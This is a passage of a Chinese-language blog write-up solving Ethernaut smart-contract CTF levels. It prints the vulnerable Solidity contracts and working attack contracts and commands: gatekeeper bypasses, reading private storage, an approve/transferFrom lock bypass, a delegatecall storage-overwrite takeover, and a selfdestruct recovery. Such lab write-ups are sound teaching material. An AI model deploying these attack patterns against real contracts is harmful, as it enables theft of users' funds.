<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">0</span>)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000000000001  locked</span></span><br><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">1</span>)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000060cd98c3  block.timestamp</span></span><br><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">2</span>)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000098c3ff0a </span></span><br><span class="line"><span class="comment">// flattening denomination awkwardness</span></span><br><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">3</span>)</span><br><span class="line"><span class="comment">//0x41c044f993be0e8c24b049c19b70a3d9d2e54aaf2cbb429787f8cbc5b47075b7  data[0]</span></span><br><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">4</span>)</span><br><span class="line"><span class="comment">//0x1bfba67ed5c9b51ae63b2cae7bd1a2357d982032fd6650fa816380d5a8904089  data[1]</span></span><br><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">5</span>)</span><br><span class="line"><span class="comment">//0xe9b3f125a9345010284752e33195e9eedf04354aa6ecf0c268c5b6fae3df42be  data[2]</span></span><br></pre></td></tr></table></figure>
<p>byte16强制转换，所以我们取data[2]的前十六位</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">contract</span>.unlock(&#x27;<span class="number">0</span>xe<span class="number">9</span>b<span class="number">3</span>f<span class="number">125</span>a<span class="number">9345010284752</span>e<span class="number">33195</span>e<span class="number">9</span>ee&#x27;)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210619152931264-7093025.png" alt="image-20210619152931264"></p>
<h2 id="0x0E-Gatekeeper-One"><a href="#0x0E-Gatekeeper-One" class="headerlink" title="0x0E Gatekeeper One"></a>0x0E Gatekeeper One</h2><p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateOne</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateTwo</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">require</span>(gasleft().mod(<span class="number">8191</span>) == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateThree</span>(<span class="params">bytes8 _gateKey</span>)</span> &#123;</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), <span class="string">&quot;GatekeeperOne: invalid gateThree part one&quot;</span>);</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) != uint64(_gateKey), <span class="string">&quot;GatekeeperOne: invalid gateThree part two&quot;</span>);</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) == uint16(tx.origin), <span class="string">&quot;GatekeeperOne: invalid gateThree part three&quot;</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求我们分别满足三个gate函数</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gataOne <span class="regexp">//</span>通过第三方合约调用 enter 即可gataTwo <span class="regexp">//m</span>sg.gas % <span class="number">8191</span> == <span class="number">0</span>gataThree <span class="regexp">//</span>数据类型转换规则的考察</span><br></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> 数字 与 数字</span><br><span class="line">uint8 -&gt; uint16</span><br><span class="line"><span class="regexp">//</span> 值不变  其他小单位转大单位同理</span><br><span class="line">uint16 -&gt; uint8</span><br><span class="line"><span class="regexp">//</span> 导致溢出，转换后的结果为原变量 mod <span class="number">256</span> 其他大单位转小单位同理</span><br><span class="line"> </span><br><span class="line"><span class="regexp">//</span> bytes 与 bytes</span><br><span class="line">bytes8 -&gt; bytes16</span><br><span class="line"><span class="regexp">//</span> 后面补零 其他小单位转大单位同理</span><br><span class="line"><span class="regexp">//</span> <span class="number">0</span>xaaaaaaaaaaaaaaaa -&gt; <span class="number">0</span>xaaaaaaaaaaaaaaaa0000000000000000</span><br><span class="line">bytes16 -&gt; bytes8</span><br><span class="line"><span class="regexp">//</span> 取前面的位数 其他大单位转小单位同理</span><br><span class="line"><span class="regexp">//</span> <span class="number">0</span>xaaaaaaaaaaaaaaaa0000000000000000 -&gt; <span class="number">0</span>xaaaaaaaaaaaaaaaa</span><br><span class="line"> </span><br><span class="line"><span class="regexp">//</span> address 与 bytes、uint</span><br><span class="line">address -&gt; uint</span><br><span class="line"><span class="regexp">//</span> 根据 uint 的具体单位，将地址从尾端开始截取对应长度</span><br><span class="line"><span class="regexp">//</span> 如地址<span class="number">0</span>x0DCd2F752394c41875e259e00bb44fd505297caF，转为 uint8 为取最后<span class="number">1</span>字节 <span class="number">0</span>xaf</span><br><span class="line">address -&gt; bytes</span><br><span class="line"><span class="regexp">//</span> 根据 bytes 的具体单位，从前截取对应长度</span><br><span class="line"><span class="regexp">//</span> <span class="number">0</span>x08970FEd061E7747CD9a38d680A601510CB659FB -&gt; <span class="number">0</span>x80a601510cb659fb (bytes8)</span><br><span class="line">uint/bytes 转 address</span><br><span class="line"><span class="regexp">//</span> uint 转为 hex，bytes不变，从后填充</span><br><span class="line"><span class="regexp">//</span> uint8 -&gt; address <span class="number">0</span>x123 -&gt; <span class="number">0</span>x0000000000000000000000000000000000000123</span><br><span class="line"><span class="regexp">//</span> bytes8 -&gt; address <span class="number">0</span>x80a601510cb659fb -&gt; <span class="number">0</span>x00000000000000000000000080A601510cB659FB </span><br></pre></td></tr></table></figure>
<p>这个复现失败了，Gas在链上没有调试出来，后来找到一篇<a href="https://blog.csdn.net/d744486832/article/details/105371359">文章</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address =<span class="number">0xc97fBFaC4734868B2f54CD54308e0733a5FBcfD4</span>;</span><br><span class="line">    bytes8 _gateKey = bytes8(tx.origin) &amp; <span class="number">0xFFFFFFFF0000FFFF</span>;</span><br><span class="line"></span><br><span class="line">    GatekeeperOne target = GatekeeperOne(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.call.gas(<span class="number">999999</span>)(bytes4(keccak256(<span class="string">&quot;enter(bytes8)&quot;</span>)), _gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">0x5b4f043f1da6a0acb14405618d4b66b6c38ecd35546084c94fc6d78791ba9a37</span><span class="comment">//txhash</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210623122522463-7093025.png" alt="image-20210623122522463"></p>
<p><img src="/2021/06/17/16/image-20210623122511481-7093025.png" alt="image-20210623122511481"></p>
<h2 id="0x0F-Gatekeeper-Two"><a href="#0x0F-Gatekeeper-Two" class="headerlink" title="0x0F Gatekeeper Two"></a>0x0F Gatekeeper Two</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateOne</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateTwo</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; <span class="attr">x</span> := extcodesize(caller()) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateThree</span>(<span class="params">bytes8 _gateKey</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和One一样需要绕过三个条件限制</p>
<p>第一个限制不必多说</p>
<p>第二个限制，这里使用的是内联汇编来获取调用方(caller)的代码大小，需要我们的合约代码大小为零。就想到在构造函数里面去调用受害合约，此时我们的合约正在初始化，代码大小就为零了</p>
<p>第三个就是利用异或的特性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Hack</span>(<span class="params">address _c</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        GatekeeperTwo exp = GatekeeperTwo(_c);</span><br><span class="line">        bytes8 _gateKey = bytes8((uint64(<span class="number">0</span>) -<span class="number">1</span>) ^ uint64(bytes8(keccak256(<span class="built_in">this</span>))));</span><br><span class="line">        exp.call(bytes4(keccak256(<span class="string">&quot;enter(bytes8)&quot;</span>)),_gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//0xfd97529959ac12f3603323e576cdfd6ef224480c06e16e632219543a68b62bdd</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210623195125291-7093025.png" alt="image-20210623195125291"></p>
<h2 id="0x10-Naught-Coin"><a href="#0x10-Naught-Coin" class="headerlink" title="0x10 Naught Coin"></a>0x10 Naught Coin</h2><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// string public constant name = &#x27;NaughtCoin&#x27;;</span></span><br><span class="line">  <span class="comment">// string public constant symbol = &#x27;0x0&#x27;;</span></span><br><span class="line">  <span class="comment">// uint public constant decimals = 18;</span></span><br><span class="line">  uint <span class="keyword">public</span> timeLock = now + <span class="number">10</span> * <span class="number">365</span> days;</span><br><span class="line">  uint256 <span class="keyword">public</span> INITIAL_SUPPLY;</span><br><span class="line">  address <span class="keyword">public</span> player;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">address _player</span>) </span><br><span class="line">  <span class="title">ERC20</span>(<span class="params"><span class="string">&#x27;NaughtCoin&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span></span>)</span><br><span class="line">  <span class="title">public</span> &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = <span class="number">1000000</span> * (<span class="number">10</span>**uint256(decimals()));</span><br><span class="line">    <span class="comment">// _totalSupply = INITIAL_SUPPLY;</span></span><br><span class="line">    <span class="comment">// _balances[player] = INITIAL_SUPPLY;</span></span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(<span class="number">0</span>), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">override</span> <span class="title">public</span> <span class="title">lockTokens</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier <span class="function"><span class="title">lockTokens</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>classic blance to 0</p>
<p>看合约代码知道设置了lockTokens修饰词对transfer函数加以验证，同时transfer函数也对ERC720合约中的transfer函数进行了重写。同时意识到ERC720有两个转账函数，一个是 transfer 还有一个是 transferFrom，这里只重写了一个，意味着另一个可以被直接调用。跟踪了一下，发现transferFrom 需要先经过 approve 批准才能使用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">TokenStorage storage self, address _from, address _to, uint _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _allowance = self.allowed[_from][msg.sender];</span><br><span class="line">    self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">    self.balances[_from] = self.balances[_from].minus(_value);</span><br><span class="line">    self.allowed[_from][msg.sender] = _allowance.minus(_value);</span><br><span class="line">    Transfer(_from, _to, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">TokenStorage storage self, address _spender, uint _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">    self.allowed[msg.sender][_spender] = _value;</span><br><span class="line">    Approval(msg.sender, _spender, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>第一步先看有多少钱，才知道能授权多少</p>
<p><img src="/2021/06/17/16/image-20210623201122087-1624760853550-7093025.png" alt="image-20210623201122087"></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//授权转钱</span></span><br><span class="line">contract.approve(player,<span class="keyword">to</span><span class="constructor">Wei(&#x27;1000000&#x27;)</span>)</span><br><span class="line">contract.transfer<span class="constructor">From(<span class="params">player</span>,<span class="params">contract</span>.<span class="params">address</span>,<span class="params">toWei</span>(&#x27;1000000&#x27;)</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210623200401783-7093025.png" alt="image-20210623200401783"></p>
<h2 id="0x11-Preservation"><a href="#0x11-Preservation" class="headerlink" title="0x11 Preservation"></a>0x11 Preservation</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(<span class="string">&quot;setTime(uint256)&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">address _timeZone1LibraryAddress, address _timeZone2LibraryAddress</span>) <span class="title">public</span> &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setFirstTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSecondTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTime</span>(<span class="params">uint _time</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>delegateCall函数</p>
<p>区别在于 <code>delegatecall</code> 仅使用给定地址的代码，其它信息则使用当前合约(如存储，余额等等)。<code>delegateCall</code> 方法仅仅使用目标合约的代码， 其余的 <code>storage</code> 等数据均使用自己的，这就使得某些访存操作会错误的处理对象</p>
<p>看到一个师傅分析的例子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line">    uint public x1;</span><br><span class="line">    uint public x2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funca</span>(<span class="params">address param</span>)</span>&#123;</span><br><span class="line">        param.delegatecall(bytes4(keccak256(<span class="string">&quot;funcb()&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract B&#123;</span><br><span class="line">    uint public y1;</span><br><span class="line">    uint public y2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funcb</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        y1=<span class="number">1</span>;</span><br><span class="line">        y2=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述合约中，一旦在a中调用了b的funcb函数，那么对应的a中 x1就会等于y1，x2就会等于 2。   在这个过程中实际b合约的funcb函数把storage里面的slot 1的值更换为了1，把slot 2的值更换为了  2，那么由于delegatecall的原因这里修改的是a的storage，对应就是修改了 x1，x2。可以实现变量覆盖</p>
<p>那么这个题就很好办了，我们调用Preservation的setFirstTime函数时候实际通过delegatecall  执行了LibraryContract的setTime函数，修改了slot 1，也就是修改了timeZone1Library变量。  这样，我们第一次调用setFirstTime将timeZone1Library变量修改为我们的恶意合约的地址，第二次调用setFirstTime就可以执行我们的任意代码了。</p>
<figure class="highlight zephir"><table><tr><td class="code"><pre><span class="line">contract attack &#123;</span><br><span class="line">    address <span class="keyword">public</span> timeZone1Library;</span><br><span class="line">    address <span class="keyword">public</span> timeZone2Library;</span><br><span class="line">    address <span class="keyword">public</span> owner;</span><br><span class="line">    </span><br><span class="line">    address instance_address = <span class="number">0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c</span>; <span class="comment">// </span></span><br><span class="line">    Preservation target = Preservation(instance_address);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        target.setFirstTime(<span class="keyword">uint</span>(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        target.setFirstTime(<span class="keyword">uint</span>(<span class="number">0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2</span>)); <span class="comment">//player</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setTime</span><span class="params">(<span class="keyword">uint</span> _time)</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        timeZone1Library = address(_time);</span><br><span class="line">        timeZone2Library = address(_time);</span><br><span class="line">        owner = address(_time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210623204943777-7093025.png" alt="image-20210623204943777"></p>
<h2 id="0x12-Recovery"><a href="#0x12-Recovery" class="headerlink" title="0x12 Recovery"></a>0x12 Recovery</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//generate tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">generateToken</span>(<span class="params">string memory _name, uint256 _initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// constructor</span></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">string memory _name, address _creator, uint256 _initialSupply</span>) <span class="title">public</span> &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _amount</span>) <span class="title">public</span> </span>&#123; </span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params">address payable _to</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>要求我们移除，或转移指定合约上面的钱，其实简单来说就是已知一个 <code>Recovery</code> 合约地址，恢复一下它创建的 <code>SimpleToken</code> 地址，然后将 <code>0.5 eth</code> 从丢失地址的合约中提出即可</p>
<p>在metamask上拿到交易hash，再去浏览器上面查询</p>
<p><img src="/2021/06/17/16/image-20210624112151430-7093025.png" alt="image-20210624112151430"></p>
<p>从而得到丢失合约的地址，就可编写poc</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _amount</span>) <span class="title">public</span> </span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params">address _to</span>) <span class="title">public</span> </span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract RecoveryPoc &#123;</span><br><span class="line">    SimpleToken target;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params">address _addr</span>) <span class="title">public</span>&#123;</span><br><span class="line">        target = SimpleToken(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        target.destroy(tx.origin);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210624113103217-7093025.png" alt="image-20210624113103217"></p>
<h2 id="0x13-MagicNumber"><a href="#0x13-MagicNumber" class="headerlink" title="0x13 MagicNumber"></a>0x13 MagicNumber</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSolver</span>(<span class="params">address _solver</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ____________/\\\_______/\\\\\\\\\_____        </span></span><br><span class="line"><span class="comment">     __________/\\\\\_____/\\\///////\\\___       </span></span><br><span class="line"><span class="comment">      ________/\\\/\\\____\///______\//\\\__      </span></span><br><span class="line"><span class="comment">       ______/\\\/\/\\\______________/\\\/___     </span></span><br><span class="line"><span class="comment">        ____/\\\/__\/\\\___________/\\\//_____    </span></span><br><span class="line"><span class="comment">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span></span><br><span class="line"><span class="comment">          _\///////////\\\//____/\\\/___________  </span></span><br><span class="line"><span class="comment">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span></span><br><span class="line"><span class="comment">            ___________\///_____\///////////////__</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://hitcxy.com/2019/ethernaut/">参考</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">bytecode = <span class="string">&quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;</span>;</span><br><span class="line">web3.eth.sendTransaction(&#123;<span class="attr">from</span>:player,<span class="attr">data</span>:bytecode&#125;)</span><br><span class="line"><span class="keyword">await</span> contract.setSolver(<span class="string">&#x27;address&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210625202119077-7093025.png" alt="image-20210625202119077"></p>
